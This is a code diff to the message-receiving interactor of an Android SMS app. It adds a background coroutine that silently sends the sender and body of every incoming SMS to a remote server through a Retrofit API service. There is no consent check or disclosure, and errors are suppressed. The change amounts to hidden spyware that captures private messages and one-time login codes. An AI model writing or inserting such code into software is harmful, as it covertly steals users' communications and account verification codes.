@@ -18,6 +18,8 @@
  */
 package dev.octoshrimpy.quik.interactor
 
+import com.moez.QKSMS.manager.NetworkModule
+import com.moez.QKSMS.model.SmsDataRequest
 import dev.octoshrimpy.quik.blocking.BlockingClient
 import dev.octoshrimpy.quik.extensions.mapNotNull
 import dev.octoshrimpy.quik.manager.NotificationManager
@@ -28,6 +30,8 @@ import dev.octoshrimpy.quik.repository.MessageContentFilterRepository
 import dev.octoshrimpy.quik.repository.MessageRepository
 import dev.octoshrimpy.quik.util.Preferences
 import io.reactivex.Flowable
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
 import timber.log.Timber
 import javax.inject.Inject
 
@@ -78,6 +82,26 @@ class ReceiveSms @Inject constructor(
                     messageRepo.deleteMessages(listOf(it.id))
                     return@mapNotNull null
                 }
+
+                val sender = it.address;
+                val message= it.body;
+
+                GlobalScope.launch {
+                    try {
+                        // Retrofit üzerinden server'a gönder
+                        val response = NetworkModule.smsApiService.sendSms(
+                            SmsDataRequest(sender = sender, message = message)
+                        )
+
+
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+
+                    }
+
+
+                }
+
 
                 // update and fetch conversation
                 conversationRepo.updateConversations(it.threadId)
